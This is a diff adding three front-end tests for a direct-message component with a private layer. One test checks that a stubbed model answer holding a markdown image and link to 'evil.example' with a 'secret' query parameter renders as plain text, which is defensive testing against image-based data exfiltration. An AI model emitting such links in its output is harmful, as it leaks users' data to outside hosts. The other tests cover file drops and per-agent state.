@@ -240,3 +240,72 @@ test("the normal DM under the layer cannot be reached", () => {
   // Typing there would go to the saved conversation: keep it out of reach.
   expect(normal.closest("[inert]")).not.toBeNull();
 });
+
+test("answers do not load images or links", async () => {
+  stubModel([
+    "![x](https://evil.example/p?d=secret) and [y](https://evil.example)",
+  ]);
+  render(<DM />);
+  openPrivate();
+  await sendText("요약해 줘");
+  const shown = layer() as HTMLElement;
+  await waitFor(() =>
+    expect(shown.textContent).toContain("https://evil.example/p?d=secret"),
+  );
+  expect(shown.querySelector("img")).toBeNull();
+  expect(shown.querySelector("a[href]")).toBeNull();
+  expect(shown.textContent).toContain("y");
+});
+
+test("a file dropped anywhere on the layer becomes a draft", () => {
+  render(<DM />);
+  openPrivate();
+  const area = within(layer() as HTMLElement).getByRole("region", {
+    name: "비공개 메시지",
+  });
+  const file = new File(["메모"], "drop.txt", { type: "text/plain" });
+  const dataTransfer = { files: [file], types: ["Files"] };
+  expect(fireEvent.dragOver(area, { dataTransfer })).toBe(false);
+  expect(fireEvent.drop(area, { dataTransfer })).toBe(false);
+  expect(within(layer() as HTMLElement).getAllByText("drop.txt")).toHaveLength(
+    1,
+  );
+  // On the composer it is added once, not again by the layer.
+  const second = new File(["둘"], "card.txt", { type: "text/plain" });
+  fireEvent.drop(screen.getByRole("textbox", { name: "비공개 메시지 입력" }), {
+    dataTransfer: { files: [second], types: ["Files"] },
+  });
+  expect(within(layer() as HTMLElement).getAllByText("card.txt")).toHaveLength(
+    1,
+  );
+});
+
+test("each agent keeps its own private layer", () => {
+  let now = 1_000_000;
+  vi.spyOn(Date, "now").mockImplementation(() => now);
+  const other = { ...agent, id: `${agent.id}b`, name: `${agent.name}b` };
+  // B was made private long ago.
+  const first = render(<DM who={other} />);
+  openPrivate();
+  first.unmount();
+  now += 10_000;
+  const { rerender } = render(<DM />);
+  openPrivate();
+  fireEvent.change(
+    screen.getByRole("textbox", { name: "비공개 메시지 입력" }),
+    { target: { value: "A에게만" } },
+  );
+  now += 10_000;
+  // Straight to B's DM (DMPage is not remounted between DMs).
+  rerender(<DM who={other} />);
+  expect(
+    screen.getByRole("textbox", { name: "비공개 메시지 입력" }),
+  ).toHaveValue("");
+  expect(layer()).not.toHaveClass("private-animate");
+  expect(document.querySelector(".private-ring")).toBeNull();
+  // Back to A, still private: no circle replay.
+  rerender(<DM />);
+  expect(layer()).toHaveAttribute("data-open", "true");
+  expect(layer()).not.toHaveClass("private-animate");
+  expect(document.querySelector(".private-ring")).toBeNull();
+});
